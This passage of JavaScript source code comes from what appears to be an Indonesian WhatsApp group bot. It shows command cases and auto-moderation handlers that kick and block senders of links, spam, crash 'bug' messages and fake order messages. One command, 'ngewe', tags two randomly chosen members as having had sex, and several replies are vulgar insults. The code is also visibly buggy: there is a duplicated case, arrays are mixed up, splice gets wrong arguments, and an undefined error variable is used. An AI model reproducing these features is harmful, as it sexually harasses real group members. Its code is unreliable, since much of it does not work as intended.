          case 'ngewe':
				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					jds = []
					const jdiid = groupMembers
					const kosst = groupMembers
					const akuut = jdiid[Math.floor(Math.random() * jdiid.length)]
					const diaat = kosst[Math.floor(Math.random() * kosst.length)]
					teks = `Yang ngewe kemarin di grub ini adalah @${akuut.jid.split('@')[0]} dan @${diaat.jid.split('@')[0]} `
					jds.push(akuut.jid)
					jds.push(diaat.jid)
					mentions(teks, jds, true)
					await limitAdd(sender)
					break

					//GC MANAGER
case 'antilinkgc':
case 'antilinkgrup':
case 'antilinkgroup':
//by @arifirazzaq2001
//fix By M4N1K
                    if (!isGroup) return reply(ind.groupo())
					if (!mek.key.fromMe && !isGroupAdmins) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin())
					if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
					if (Number(args[0]) === 1) {
						if (isAntiLink) return reply('anti link group sudah aktif')
						antilink.push(from)
						fs.writeFileSync('./database/group/antilink.json', JSON.stringify(antilink))
						} else if (Number(args[0]) === 0) {
						if (isAntiLink) return reply('Mode anti link group sudah dimatikan')
						var ini = antilink.indexOf(from)
						antilink.splice(ini)
						fs.writeFileSync('./database/group/antilink.json', JSON.stringify(antilink))
						reply('Sukes menonaktifkan anti link group di group ini ✔️')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					break
case 'antilinkyoutube':
//by @arifirazzaq2001
//fix By M4N1K
                    if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin())
					if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
					if (Number(args[0]) === 1) {
						if (isAntiLinkytv) return reply('anti link YouTube video sudah aktif')
						antilinkytv.push(from)
						fs.writeFileSync('./database/group/antilinkyt.json', JSON.stringify(antilinkytv))
						reply('Sukses mengaktifkan anti link YouTube di group ini ✔️')
						zacky.sendMessage(from,`「 *NOTICE GROUP* 」Jika bukan admin jangan kirim link YouTube Video`, text)
					} else if (Number(args[0]) === 0) {
						if (isAntiLinkytv) return reply('Mode anti link YouTube video sudah Mati')
						var ini = antilinkytv.indexOf(from)
						antilinkytv.splice(ini, 1)
						fs.writeFileSync('./database/group/antilinkyt.json', JSON.stringify(antilinkytv))
						reply('Sukes menonaktifkan anti link YouTube video di group ini ✔️')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					break
case 'antilinkyoutube':
//by @arifirazzaq2001
//fix By M4N1K
                    if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin())
					if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
					if (Number(args[0]) === 1) {
						if (isAntiLinkytc) return reply('anti link YouTube channel sudah aktif')
						antilinkytc.push(from)
						fs.writeFileSync('./database/group/antilinkytchannel.json', JSON.stringify(antilinkytc))
						reply('Sukses mengaktifkan anti link YouTube channel di group ini ✔️')
						zacky.sendMessage(from,`「 *NOTICE GROUP* 」Jika bukan admin jangan kirim link YouTube Channel`, text)
					} else if (Number(args[0]) === 0) {
						if (isAntiLinkytc) return reply('Mode anti link YouTube channel sudah Mati')
						var ini = antilinkytv.indexOf(from)
						antilinkytc.splice(ini, 1)
						fs.writeFileSync('./database/group/antilinkytchannel.json', JSON.stringify(antilinkytc))
						reply('Sukes menonaktifkan anti link YouuTube channel di group ini ✔️')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					break
case 'antilinkig':
case 'antilinkinstagram':
//by @arifirazzaq2001
//fix By M4N1K
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin())
					if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
					if (Number(args[0]) === 1) {
						if (isAntiLinkig) return reply('UDAH NYALA KAK')
						antilinkig.push(from)
						fs.writeFileSync('./database/group/antilinkig.json', JSON.stringify(antilinkig))
						reply('SUKSES MENGAKTIFKAN ANTI LINK INSTAGRAM')
						zacky.sendMessage(from,`「 *NOTICE GROUP* 」Jika bukan admin jangan kirim link IG`, text)
					} else if (Number(args[0]) === 0) {
						if (!isAntiLinkig) return reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
						var ini = antilinkig.indexOf(from)
						antilinkig.splice(ini, 1)
						fs.writeFileSync('./database/group/antilinkig.json', JSON.stringify(antilinkig))
						reply('SUKSES MEMATIKAN ANTI LINK IG DI GROUP')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					break
case 'antilinktele':
case 'antilinktelegram':
//by @arifirazzaq2001
//Fix By M4N1K
                    if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin())
					if (args.length < 1) return reply('ketik enable untuk mengaktifkan')
					if (args[0] === '1') {
					if (isAntiLinkTelegram) return reply('*SUDAH DI AKTIFKAN SEBELUMNYA*')
						antitelegram.push(from)
						fs.writeFileSync('./database/group/antilinktelegram.json', JSON.stringify(antitelegram))
						reply('「 *TELEGRAM DETECTOR* 」 PERINTAH DITERIMA, ANTI LINK TELEGRAM SUDAH ENABLE!')
						zacky.sendMessage(from,`「 *NOTICE GROUP* 」Jika bukan admin jangan kirim link Telegram! Jika Anda Kirim Maka Bot Akan Mengeluarkanmu.`, text)
					} else if (args[0] === '0') {
						var ini = antitelegram.indexOf(from)
						antitelegram.splice(ini, 1)
						fs.writeFileSync('./database/group/antilinktelegram.json', JSON.stringify(antitelegram))
						reply('「 *TELEGRAM DETECTOR* 」 PERINTAH DI TERIMA, ANTI LINK TELEGRAM SUDAH DISABLE!')
					} else {
						reply('enable untuk mengaktifkan, disable untuk menonaktifkan')
					}
					break

                    //Anti virus
                    case 'antivirus':
                    case 'antivirtex':
                    case 'antifirtex':
                    if (!isGroup) return reply(ind.groupo())
					if (!mek.key.fromMe && !isGroupAdmins) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin())
					if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
					if (Number(args[0]) === 1) {
					if (isAntiFirtex) return reply('*SUDAH DI AKTIFKAN SEBELUMNYA*')
						antifirtex.push(from)
						fs.writeFileSync('./database/group/antifirtex.json', JSON.stringify(antifirtex))												
					} else if (Number(args[0]) === 0) {					
						antifirtex.splice(ini, 1)
						fs.writeFileSync('./database/group/antifirtex.json', JSON.stringify(antifirtex))
						reply('「 *VIRTEX DETECTOR* 」\n\nANTI VIRTEX SUDAH DINONAKTIFKAN PADA GRUP INI.')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					break

                case 'event':
				if (!isGroup) return reply(ind.groupo())
				if (!isAdmin) return reply('*Only Adminban & Owner Kami!*')
				if (args.length < 1) return reply('Mengaktifkan tekan 1, Menonaktif tekan 0')
				if (Number(args[0]) === 1) {
				if (isEventon) return reply('*Fitur event sudah aktif sebelum nya*')
				event.push(from)
				fs.writeFileSync('.data/bot/event.json', JSON.stringify(event))
				reply(' SUCCSESS  mengaktifkan fitur event di group ini')
				} else if (Number(args[0]) === 0) {
				event.splice(from, 1)
				fs.writeFileSync('./data/bot/event.json', JSON.stringify(event))
				reply(' SUCCSESS  menonaktifkan fitur event di group ini')
				} else {
				reply(ind.satukos())
				}
				break
				
                case 'nobadword':
                 //Fix By M4N1K
                  if (!isGroup) return reply(ind.groupo())
		      	  if (!isGroupAdmins) return reply(ind.admin())
                  if (args.length < 1) return reply('lel🗿')
                  if (args[0] === 'aktif') {
                  if (isBadWord) return reply('*fitur BadWord sudah aktif tadi!!*')
                 	   badword.push(from)
                 	   fs.writeFileSync('./database/group/badword.json', JSON.stringify(badword))
                  	   reply(`badword is enable`)
              	  } else if (args[0] === 'mati') {
                  	  badword.splice(from, 1)
                 	   fs.writeFileSync('./database/group/badword.json', JSON.stringify(badword))
                 	    reply(`badword is disable`)
             	   } else {
                 	   reply(ind.satukos())
                	}
                    break
                case 'addbadword':
                //Fix By M4N1K
                    if (!isGroup) return reply(ind.groupo())
                    if (!isGroupAdmins) return reply(ind.admin())
                    if (args.length < 1) return reply( `Kirim perintah ${prefix}addbadword [kata kasar]. contoh ${prefix}addbadword bego`)
                    const bw = body.slice(12)
                    bad.push(bw)
                    fs.writeFileSync('./database/group/bad.json', JSON.stringify(bad))
                    reply('Success Menambahkan Bad Word!')
                    break
                case 'delbadword':
               //Fix By M4N1K
                    if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		            if (!isGroup) return reply(ind.groupo())         
                    if (!isGroupAdmins) return reply(ind.admin())
                    if (args.length < 1) return reply( `Kirim perintah ${prefix}addbadword [kata kasar]. contoh ${prefix}addbadword bego`)
                    let dbw = body.slice(12)
                    bad.splice(dbw)
                    fs.writeFileSync('./database/group/bad.json', JSON.stringify(bad))
                    reply('Success Menghapus BAD WORD!')
                    break 
                    case 'listbadword':
                    let lbw = `Ini adalah list BAD WORD\nTotal : ${bad.length}\n`
                    for (let i of bad) {
                        lbw += `➸ ${i.replace(bad)}\n`
                    }
                    await reply(lbw)
                    break 
                    case 'shutdown':
                    if (!isOwner) return reply('Owner Only')
                    setTimeout( () => {
			        reply(`GOOD BYE OWNER, I LOVE YOU`) 
					}, 3000)
                    zacky.sendMessage(from, JSON.stringify(eval(process.exit())), text, {quoted:mek})
                    break
                    case 'leveling':
				if (!isGroup) return reply(ind.groupo())
				if (!mek.key.fromMe && !isGroupAdmins) return reply(ind.admin())
				if (args.length < 1) return reply('Mengaktifkan tekan 1, Menonaktif tekan 0')
				if (args[0] === '1') {
				if (isLevelingOn) return reply('*Fitur level sudah aktif sebelum nya*')
				_leveling.push(from)
				fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
				reply(ind.lvlon())
				} else if (args[0] === '0') {
				_leveling.splice(from, 1)
				fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
				reply(ind.lvloff())
				} else {
				reply(ind.satukos())
				}
				break
			    case 'nsfw':
				if (!isGroup) return reply(ind.groupo())
				if (!mek.key.fromMe && !isGroupAdmins) return reply(ind.admin())
				if (args.length < 1) return reply('Mengaktifkan tekan 1, Menonaktif tekan ')
				if (Number(args[0]) === 1) {
				if (isNsfw) return reply('*Fitur nsfw sudah aktif sebelum nya*')
				nsfw.push(from)
				fs.writeFileSync('./database/bot/nsfw.json', JSON.stringify(nsfw))
				reply('Sukes mengaktifkan mode nsfw di group ini ')
				} else if (Number(args[0]) === 0) {
				nsfw.splice(from, 1)
				fs.writeFileSync('./data/bot/nsfw.json', JSON.stringify(nsfw))
				reply('Sukes menonaktifkan mode nsfw di group ini ')
				} else {
				reply(ind.satukos())
				}
				break 
				case 'sewabot': // KALO BOLEH JANGAN DIGANTI YAH:)
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				tres = `
╭━━━━━━━━━━━━┈ ❋ཻུ۪۪⸙
│ *「 INFO BOT 」*
│➛ *Nama Bot* : ManikBot
│➛ *Versi* : V10.0
│➛ *Creator* : Manik Ganteng^v^
╰┬────────────┈ ⳹
    │ *「HARGA SEWA 」* 
    │➛ *1 BULAN* : 15K
    │➛ *2 BULAN* : 30K
    │➛ *4 BULAN* : 50K
    │ *「HARGA SCRIPT 」* 
    │➛ *SC INI* : CARI YT「 ᴍᴀɴɪᴋ ᴏғғɪᴄɪᴀʟツ 」
    │➛ *SC PREMIUM* : 60K
    ╰─────────────┈ ⳹
    HUB: wa.me://6285737134572`
    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: ftoko, caption: tres, contextInfo: {forwardingScore: 1000, isForwarded: true}}) 
				break
				case 'level':                
				if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
                const userLevel = getLevelingLevel(sender)
                const userXp = getLevelingXp(sender)
                if (userLevel === undefined && userXp === undefined) return reply(ind.lvlnul())
                const requiredXp = 3000 * (Math.pow(2, userLevel) - 1)
                resul = `
□ *LEVEL USER*
┝ *Nama* : ${pushname}
┝ *Nomor* : @${sender.split("@")[0]}
┝ *User XP* : ${userXp}/${requiredXp}
┝ *User Level* : ${userLevel}
┝ *Tingkat* : ${bars}
┝ *Rank* : ${ManikRole}
┕`
                zacky.sendMessage(from, resul, text, { quoted: mek})
                .catch(async (err) => {
                console.error(err)
                await reply(`Error!\n${err}`)
                })
                break                
                case 'jam':
                case 'waktu':
                tekj = `Sekarang Jam :\n${wib} WIB\n${wita} WITA\n${wit} WIT`
                zacky.sendMessage(from, tekj, text)
                break
                case 'tanggal':
                tekj = `Sekarang Tanggal : ${tampilTanggal}`
                zacky.sendMessage(from, tekj, text)
                break
                case 'imgreply':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					fak = body.slice(10)
					zacky.sendMessage(from, `${fak}`, text, { sendEphemeral: true, thumbnail: fs.readFileSync('./lib/◇.jpeg', 'base64')})
					break
					
					case 'cekprefix':
					if (isBanned) return reply('Lu sudah terbenned!')
					zacky.sendMessage(from, `Prefix saat ini: *「 ${prefix} 」*`, text, {quoted: freply})
					break
					case 'energy':
					case 'baterai':
					case 'batre':
					case 'battery':
					if (isBanned) return reply('Lu sudah terbenned!')
					zacky.sendMessage(from, `Energi: ${battre}%`, text, {quoted: btrai})
					break
					
					case 'debug':
			 res = await zacky.prepareMessageFromContent(from,{
"templateMessage": {
						"hydratedTemplate": {
							"hydratedContentText": `Hi ${pushname} 👋`,
							"hydratedFooterText": `${NamaBot}`,
							"hydratedButtons": [
								{
									"quickReplyButton": {
										"displayText": "List Menu",
										"id": `command`
									},
									"index": 0
								},
								{
									"quickReplyButton": {
										"displayText": "Menu",
										"id": `allmenu`
									},
									"index": 1
								},
								{
									"quickReplyButton": {
										"displayText": "Instagram",
										"id": `igm`
									},
									"index": 2
								}
							]
						}
					}
				}, {}) 
zacky.relayWAMessage(res)
break

					case 'debug2':
   res = await zacky.prepareMessageFromContent(from,{
"templateMessage": {
  "hydratedFourRowTemplate": {
    "hydratedContentText": "",
    "hydratedFooterText": "",
    "hydratedButtons": [
      {
        "urlButton": {
          "displayText": "Grup Bot",
          "url": "https://chat.whatsapp.com/B5xKfSwQR3a6258K9DXhiR"
        },
        "index": 0
      }
    ]
  },
  "hydratedTemplate": {
    "hydratedContentText": `Hi ${pushname} 👋`,
    "hydratedFooterText": `${NamaBot}`,
    "hydratedButtons": [
      {
        "urlButton": {
          "displayText": `Script ${NamaBot}`,
          "url": "https://github.com/dcode-denpa"
        },
        "index": 0
      }
    ]
  }
}
}, {})
zacky.relayWAMessage(res)
break

					case 'debug3':
					booooom = `Hi ${pushname}`
                         let Buttons = [{
                                urlButton: {
                                    displayText: 'Group Bot',
                                    url: 'https://chat.whatsapp.com/B5xKfSwQR3a6258K9DXhiR'
                                }
                            }, {
                                callButton: {
                                    displayText: 'Number Phone Owner',
                                    phoneNumber: `+${manikganz.NomorOwner}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '⋮☰ ALL MENU',
                                    id: 'allmenu'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '⎙ LIST MENU',
                                    id: 'command'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: '👤 OWNER',
                                    id: 'owner'
                                }
                            }]               
            sendButLocation2(from, booooom, `${wib} WIB\n${day} - ${myMonths[bulan]} - ${year}\n\n© ${creator}`, imagoh, Buttons)            
            break


case 'debug4':
var imgs = await zacky.prepareMessage('0@c.us', fpp, image, { thumbnail: fpp })
            var imgCatalog = imgs.message.imageMessage
            var ctlg = await zacky.prepareMessageFromContent(from, {
                "productMessage": {
                    "product": {
                        "productImage": imgCatalog,
                        "productId": "4457725420906655",
                        "title": `ALL MENU`,
                        "description": help(prefix),
                        "footerText": `メLord Akira⁴̅⁰͍⁴̵`,
                        "currencyCode": "IDR",
                        "priceAmount1000": "100000000",
                        "productImageCount": 1,
                        "firstImageId": 1,
                        "salePriceAmount1000": "35000000",
                        "retailerId": `YouTube : KirBotz×`,
                        "url": `OWNER : https://wa.me/${manikganz.ownerNumber}\nYT : https://bit.ly/3BpBe1Z\nGROUP : https://bit.ly/3Ene2TO`
                    },
                    "businessOwnerJid": `${manikganz.ownerNumber}@s.whatsapp.net`,
                }
            }, { quoted: mek, mimetype: 'image/jpeg' })
            zacky.relayWAMessage(ctlg)
            break
//=====================================MAU TAMBAH? DISINI AJA YA=====================================\\

//=====================================PENAMBAHAN KEATAS COK=====================================\\

				default:		
//		if (hour_now >= '02:00' && hour_now <= '04:00') {
//          console.log(color('[PESAN DARI ZACKY]', 'cyan'), color('Waktunya tidur kak soalnya udah malam', 'yellow'), color('(😊)', 'white'))
//          }
//        if (hour_now >= '04:00' && hour_now <= '05:00') {
//          console.log(color('[PESAN DARI ZACKY]', 'cyan'), color('Bentar lagi jam 5 nih kak, Jangan lupa sholat subuh ya', 'yellow'), color('(😊)', 'white'))
//          }
//          if (hour_now >= '05:00' && hour_now <= '06:00') {
//          console.log(color('[PESAN DARI ZACKY]', 'cyan'), color('Udah sholat Subuh belum kak', 'yellow'), color('(🙄)', 'white'))
//          }
//        if (hour_now >= '06:00' && hour_now <= '08:00') {
//          console.log(color('[PESAN DARI ZACKY]', 'cyan'), color('Pagi kak, Jangan lupa mandi', 'yellow'), color('(😅)', 'white'))
//          }
//          if (hour_now >= '11:00' && hour_now <= '12:00') {
//          console.log(color('[PESAN DARI ZACKY]', 'cyan'), color('Siang kak, Dah mandi blm kak?', 'yellow'), color('(🙄)', 'white'))
//          }
//          if (hour_now >= '12:00' && hour_now <= '14:00') {
//           console.log(color('[PESAN DARI ZACKY]', 'cyan'), color('Dah jam 12 kak, Jangan lupa sholat Dzuhur ya kak', 'yellow'), color('(😊)', 'white'))
//           }
//        if (hour_now >= '14:00' && hour_now <= '15:00') {
//          console.log(color('[PESAN DARI ZACKY]', 'cyan'), color('Sore kak, Jangan lupa mandi', 'yellow'), color('(😅)', 'white'))
//          }
//        if (hour_now >= '15:00' && hour_now <= '16:00') {
//          console.log(color('[PESAN DARI ZACKY]', 'cyan'), color('Dah jam 3 kak, Jangan lupa sholat Ashar ya kak', 'yellow'), color('(😊)', 'white'))
//          }
//        if (hour_now >= '17:00' && hour_now <= '18:00') {
//          console.log(color('[PESAN DARI ZACKY]', 'cyan'), color('Bentar lagi Maghrib kak', 'yellow'), color('(😆)', 'white'))
//          }
//        if (hour_now >= '18:00' && hour_now <= '19:00') {
//        	console.log(color('[PESAN DARI ZACKY]', 'cyan'), color('Selamat Maghrib kak', 'yellow'), color('(😊)', 'white'))
//        }
//        if (hour_now >= '20:00' && hour_now <= '00:00') {
//           console.log(color('[PESAN DARI ZACKY]', 'cyan'), color('Selamat malam kak, Jangan begadang ya kak, Tar sakit loh', 'yellow'), color('(😄)', 'white'))
//        }
//          if (hour_now >= '00:00' && hour_now <= '02:00') {           
//           console.log(color('[PESAN DARI ZACKY]', 'cyan'), color('ZackyBot ngantuk kak, tidur dulu ya kak', 'yellow'), color('(😴)', 'white'))
//        }
        
/////*** ANTI BUG ENGINE***\\\\\
if ((Object.keys(mek.message)[0] === 'ephemeralMessage' && JSON.stringify(mek.message).includes('EPHEMERAL_SETTING')) && mek.message.ephemeralMessage.message.protocolMessage.type === 3) {
        if (bugc === false) return
        if (mek.key.fromMe) return
        if (isGroupAdmins) return
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
        nums = mek.participant
        longkapnye = "\n".repeat(420)
        tekuss = `${longkapnye}\`\`\`B U G  G C  T E R D E T E K S I\`\`\`\n@⁨${nums.split('@')[0]} akan dikick\n\n_Clear chat by bot_\n*BUG KONTOL*`
        console.log(color("[BUG DETECTED]", "orange"), 'from', color(nums.split("@")[0], "red"), 'in', color(groupName))
        zacky.sendMessage(mek.key.remoteJid, tekuss, MessageType.text, {contextInfo:{mentionedJid:[nums + "@s.whatsapp.net"]}})
        zacky.groupRemove(mek.key.remoteJid, [nums]).catch((e)=>{reply(`*ERROR&:* ${e}`)})
        zacky.blockUser(nums, "add")
        }

/////*** ANTI TROLI ENGINE***\\\\\
if (m.message && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
        if (antitrol === false) return
        if (mek.key.fromMe) return
        if (isGroupAdmins) return
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
        reply('Fake Troli Detected \n\n' + require('util').format(m.key))
        await zacky.modifyChat(m.chat, 'delete', {includeStarred: false})
        var kic = `${sender.split("@")[0]}@s.whatsapp.net`
        console.log(color("[TROLI DETECTED]", "orange"), 'from', color(sender.split("@")[0], "red"), 'in', color(groupName))		
        zacky.groupRemove(from, [kic]).catch((e)=>{reply(`*ERROR&:* ${e}`)})
		zacky.blockUser(kic, "add")
        }
                
/////*** ANTI LINK GROUP ***\\\\\
// buatan Arifi Razzaq OFFICIAL            
        if (budy.includes("://chat.whatsapp.com/")){  // [ Budy ] Tidak work untuk hidetag + link || tempatkan paling bawah hidetag baru work \\
		if (!isGroup) return
		if (isGroupAdmins) return
        if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)		
		if (budy.includes("B5xKfSwQR3a6258K9DXhiR")) return		
		if (budy.includes("CJN785qutPDFOokOLPpovd")) return 
		if (budy.includes("DXKBRuY2Y2X5A5z6hb5VVJ")) return 
		if (budy.includes("ITBC898qEqiLQtoe3DaMKa")) return 	
		if (budy.includes("DsZeXg8lJTvIttwfJeVSxw")) return
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		console.log(color("[LINK DETECTED]", "orange"), 'from', color(sender.split("@")[0], "red"), 'in', color(groupName))
		zacky.groupRemove(from, [kic]).catch((e)=>{reply(`*ERROR&:* ${e}`)})
		zacky.blockUser(kic, "add")					
		}
		
/////*** ANTI SPAM ***\\\\\
// GROUP
if (budy.length > 1000) {
        if (!isGroup) return
		if (isGroupAdmins) return
        if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)		       
        var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		console.log(color("[SPAM DETECTED]", "orange"), 'from', color(sender.split("@")[0], "red"), 'in', color(groupName))
		zacky.groupRemove(from, [kic]).catch((e)=>{reply(`*ERROR&:* ${e}`)})
		zacky.blockUser(kic, "add")		
        }            
        
// PRIVATE
if (budy.length > 500) {
        if (isGroup) return
        var kic = `${sender.split("@")[0]}@s.whatsapp.net`
        reply('Bacot Hekel Ngentod, gak ngeleg dek🖕')
		console.log(color("[SPAM DETECTED]", "orange"), 'from', color(sender.split("@")[0], "red"), 'by', color(pushname))
		zacky.blockUser(kic, "add")		
        }
        
/////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙇𝙄𝙉𝙆 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆***\\\\\
// buatan Arifi Razzaq OFFICIAL
        if (budy.includes("facebook.com/")){
		if (!isGroup) return
		if (!isAntiLinkfb) return
		if (isGroupAdmins) return reply('*Admin Terdeteksi, Bot Tidak Akan Mengeluarkan Admin Grup, Karena Admin Grup Bebas Mengirimkan Link Facebook*')
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`*「 Link Facebook Terdeteksi 」 wa.me/${sender.split("@")[0]} Maaf Anda Di Kick.*`)
		setTimeout( () => {
			zacky.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 1000)
		setTimeout( () => {
			zacky.updatePresence(from, Presence.composing)
reply("*「 BACA PERATURAN GC 」Selamat Tinggal Sobat, Lain kali Kalau Ada Masuk Grup Di Baca Dulu Peraturannya Ya Kak...*\n\n*Promosi Hanya Di Hari Ahad.*")
		}, 0)
	}

/////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙇𝙄𝙉𝙆 𝙄𝙉𝙎𝙏𝘼𝙂𝙍𝘼𝙈***\\\\\
// buatan Arifi Razzaq OFFICIAL
        if (budy.includes("instagram.com/")){
		if (!isGroup) return
		if (!isAntiLinkig) return
		if (isGroupAdmins) return reply('*Admin Terdeteksi, Bot Tidak Akan Mengeluarkan Admin Grup, Karena Admin Grup Bebas Mengirimkan Link Instagram*')
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`*「 Link Instagram Terdeteksi 」 wa.me/${sender.split("@")[0]} Maaf Anda Di Kick.*`)
		setTimeout( () => {
			zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		}, 1000)
		setTimeout( () => {
			zacky.updatePresence(from, Presence.composing)
reply("*「 BACA PERATURAN GC 」Selamat Tinggal Sobat, Lain kali Kalau Ada Masuk Grup Di Baca Dulu Peraturannya Ya Kak...*\n\n*Promosi Hanya Di Hari Ahad.*")
		}, 0)
	}
		
	
/////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙇𝙄𝙉𝙆  𝙔𝙊𝙐𝙏𝙐𝘽𝙀 𝘾𝙃𝘼𝙉𝙉𝙀𝙇***\\\\\
// buatan Arifi Razzaq OFFICIAL
        if (budy.includes("://youtube.com/")){
		if (!isGroup) return
		if (!isAntiLinkytc) return
		if (isGroupAdmins) return reply('*Admin Terdeteksi, Bot Tidak Akan Mengeluarkan Admin Grup, Karena Admin Grup Bebas Mengirimkan Link YouTube Channel*')
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`*「 Link YouTube Channel Terdeteksi 」 wa.me/${sender.split("@")[0]} Maaf Anda Di Kick.*`)
		setTimeout( () => {
			zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		}, 1000)
		setTimeout( () => {
			zacky.updatePresence(from, Presence.composing)
reply("*「 BACA PERATURAN GC 」Selamat Tinggal Sobat, Lain kali Kalau Ada Masuk Grup Di Baca Dulu Peraturannya Ya Kak...*\n\n*Promosi Hanya Di Hari Ahad.*")
		}, 0)
	}

/////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙇𝙄𝙉𝙆  𝙔𝙊𝙐𝙏𝙐𝘽𝙀 𝙑𝙄??𝙀𝙊***\\\\\
// buatan Arifi Razzaq OFFICIAL
        if (budy.includes("://youtu.be/")){
		if (!isGroup) return
		if (!isAntiLinkytv) return
		if (isGroupAdmins) return reply('*Admin Terdeteksi, Bot Tidak Akan Mengeluarkan Admin Grup, Karena Admin Grup Bebas Mengirimkan Link YouTube Video*')
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`*「 Link YouTube Video Terdeteksi 」 wa.me/${sender.split("@")[0]} Maaf Anda Di Kick.*`)
		setTimeout( () => {
			zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		}, 1000)
		setTimeout( () => {
			zacky.updatePresence(from, Presence.composing)
reply("*「 BACA PERATURAN GC 」Selamat Tinggal Sobat, Lain kali Kalau Ada Masuk Grup Di Baca Dulu Peraturannya Ya Kak...*\n\n*Promosi Hanya Di Hari Ahad.*")
		}, 0)
	}
	
/////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙇𝙄𝙉𝙆  𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈***\\\\\
// buatan Arifi Razzaq OFFICIAL
        if (budy.includes("://t.me/")){
		if (!isGroup) return
		if (!isAntiLinkTelegram) return
		if (isGroupAdmins) return reply('*Admin Terdeteksi, Bot Tidak Akan Mengeluarkan Admin Grup, Karena Admin Grup Bebas Mengirimkan Link Telegram*')
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`*「 Link Telegram Terdeteksi 」 wa.me/${sender.split("@")[0]} Maaf Anda Di Kick.*`)
		setTimeout( () => {
			zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		}, 1000)
		setTimeout( () => {
			zacky.updatePresence(from, Presence.composing)
reply("*「 BACA PERATURAN GC 」Selamat Tinggal Sobat, Lain kali Kalau Ada Masuk Grup Di Baca Dulu Peraturannya Ya Kak...*\n\n*Promosi Link Hanya Di Hari Ahad.*")
		}, 0)
	}
	
/////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙇𝙄𝙉𝙆  𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈***\\\\\
// buatan Zacky OFFICIAL	        
		if (isGroupToxic) {
		if (mek.key.fromMe) return
        zacky.updatePresence(from, Presence.recording)
        const desahan = fs.readFileSync('./mp3/desah.mp3')
